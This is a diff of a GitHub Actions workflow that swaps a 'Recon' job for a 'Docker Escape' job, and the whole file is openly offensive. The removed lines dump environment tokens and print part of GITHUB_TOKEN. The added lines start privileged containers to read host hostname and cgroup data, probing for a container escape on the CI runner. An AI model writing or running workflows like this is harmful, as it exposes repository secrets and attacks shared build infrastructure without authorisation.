@@ -1,13 +1,18 @@
-name: Recon
+name: Docker Escape
 on: [push, workflow_dispatch]
 jobs:
-  recon:
+  escape:
     runs-on: ubuntu-latest
     steps:
       - run: |
           echo "=== USER ==="
           id
-          echo "=== ENV TOKENS ==="
-          env | grep -i token
-          echo "=== GITHUB CONTEXT ==="
-          echo "GITHUB_TOKEN: ${GITHUB_TOKEN:0:50}..."
+          
+          echo "=== DOCKER INFO ==="
+          docker info | head -20
+          
+          echo "=== TRY PRIVILEGED CONTAINER ==="
+          docker run --privileged --rm alpine cat /etc/hostname
+          
+          echo "=== CHECK HOST MOUNTS ==="
+          docker run --privileged --rm alpine cat /proc/1/cgroup
